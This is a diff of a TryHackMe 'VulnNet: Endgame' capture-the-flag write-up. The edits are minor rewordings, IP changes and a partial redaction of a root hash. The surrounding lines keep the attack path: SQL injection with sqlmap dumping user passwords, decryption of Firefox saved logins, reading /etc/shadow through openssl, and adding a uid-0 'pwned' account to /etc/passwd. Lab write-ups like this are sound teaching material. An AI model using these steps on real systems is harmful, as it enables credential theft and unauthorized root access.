@@ -45,7 +45,7 @@ As usual, scan the machine for open ports via `rustscan`!
 **Rustscan:**
 ```
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
-└─# export RHOSTS=10.10.98.48
+└─# export RHOSTS=10.10.214.82
                                                                                                                          
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
 └─# rustscan --ulimit 5000 -t 2000 --range=1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
@@ -76,7 +76,7 @@ Ports Open        | Service
 
 ## HTTP on Port 80
 
-**http://10.10.98.48/:**
+**http://10.10.214.82/:**
 ```
 Our services are accessible only through the vulnnet.thm domain! 
 ```
@@ -85,7 +85,7 @@ Our services are accessible only through the vulnnet.thm domain!
 
 ![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a1.png)
 
-Nothing interesting. Let's **fuzz the subdomain** via `ffuf`:
+Nothing interesting. Since we have a domain, let's **fuzz the subdomain** via `ffuf`:
 
 ```
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/VulnNet-Endgame]
@@ -100,7 +100,7 @@ Found subdomains: `shop`, `api` and `blog`.
 
 **Adding new subdomains to `/etc/hosts`:**
 ```
-10.10.98.48 vulnnet.thm shop.vulnnet.thm api.vulnnet.thm blog.vulnnet.thm
+10.10.214.82 vulnnet.thm shop.vulnnet.thm api.vulnnet.thm blog.vulnnet.thm
 ```
 
 **http://shop.vulnnet.thm/:**
@@ -202,7 +202,7 @@ api                     [Status: 200, Size: 18, Words: 4, Lines: 1, Duration: 33
 admin1                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 18331ms]
 ```
 
-Finally found it!!
+Found new subdomain!!
 
 **Add `admin1` subdomain to `/etc/hosts`:**
 ```
@@ -223,7 +223,7 @@ Finally found it!!
 [...]
 ```
 
-When I reach the index page, it redirects me to `/en/`.
+When I reach the webroot directory, it redirects me to `/en/`.
 
 Let's enumerate hidden directory with `gobuster`:
 
@@ -420,7 +420,7 @@ available databases [3]:
 [*] vn_admin
 ```
 
-It's vulnerable to SQL injection!
+**It's vulnerable to SQL injection!**
 
 Let's enumerate the entire MySQL's databases!
 
@@ -609,7 +609,7 @@ Table: users
 [01:15:43] [INFO] table 'blog.users' dumped to CSV file '/root/.local/share/sqlmap/output/api.vulnnet.thm/dump/blog/users.csv'
 ```
 
-That's a LOT of users and the password!
+That's a LOT of users and passwords!
 
 Hmm... Let's take the `password` column's data as the **password wordlist** for the user `chris_w`? We can clean that up via `cut`.
 
@@ -841,7 +841,7 @@ Let's look at one of the directories:
 [...]
 ```
 
-Accroding to one of the [Mozilla FireFox support posts](https://support.mozilla.org/en-US/questions/1352064), **the `logins.json` holds the encrypted login credentials.**
+Accroding to one of the [Mozilla FireFox support questions](https://support.mozilla.org/en-US/questions/1352064), **the `logins.json` holds the encrypted login credentials.**
 
 To decrypt it, I'll:
 
@@ -915,7 +915,7 @@ drwxr-xr-x 18 system system 4.0K Jun 15 17:12 ..
 -r-xr-x---  1 system system 212K Jun 14 13:23 zip
 ```
 
-In here, we see 3 binaries.
+In here, we see **3 binaries**.
 
 According to [GTFOBins](https://gtfobins.github.io/gtfobins/openssl/), **`openssl` could be abused to escalate our privilege to root!**
 
@@ -924,7 +924,7 @@ According to [GTFOBins](https://gtfobins.github.io/gtfobins/openssl/), **`openss
 **Let's test reading `/etc/shadow`:**
 ```
 system@vulnnet-endgame:~/Utils$ ./openssl enc -in /etc/shadow
-root:$6$cB/S/D17$1FhKwiSpNpdxPcWJ4q91KOsJzucvpeTr8v9CRPaNmDF5SF64BcTHwR1Bx4xP3RqxK52.uZ38MHH4rQxamADbI/:19157:0:99999:7:::
+root:$6$cB/S/D17${Redacted}.uZ38MHH4rQxamADbI/:19157:0:99999:7:::
 daemon:*:18885:0:99999:7:::
 bin:*:18885:0:99999:7:::
 sys:*:18885:0:99999:7:::
@@ -937,7 +937,7 @@ system@vulnnet-endgame:~/Utils$ ls -lah /etc/shadow
 -rw-r----- 1 root shadow 1.5K Jun 14 16:48 /etc/shadow
 ```
 
-Wait, we can read `/etc/shadow`??
+**Wait, we can read `/etc/shadow`??**
 
 Hmm... If we can read `/etc/shadow`, then we might also can write things to `/etc/passwd`!
 
@@ -961,7 +961,7 @@ system@vulnnet-endgame:~/Utils$ cp /etc/passwd /tmp/passwd.bak
 system@vulnnet-endgame:~/Utils$ echo "pwned:\$1\$.YB66nk1\$8Gsn7z0GJMm8eH8D95k0K1:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
 ```
 
-> Note: Remember to escape special characters in `echo`, like `$`.
+> Note: Remember to escape special characters in `echo` via `\`, like `$`.
 
 - Overwrite the original `/etc/passwd` via `/home/system/Utils/openssl`:
 
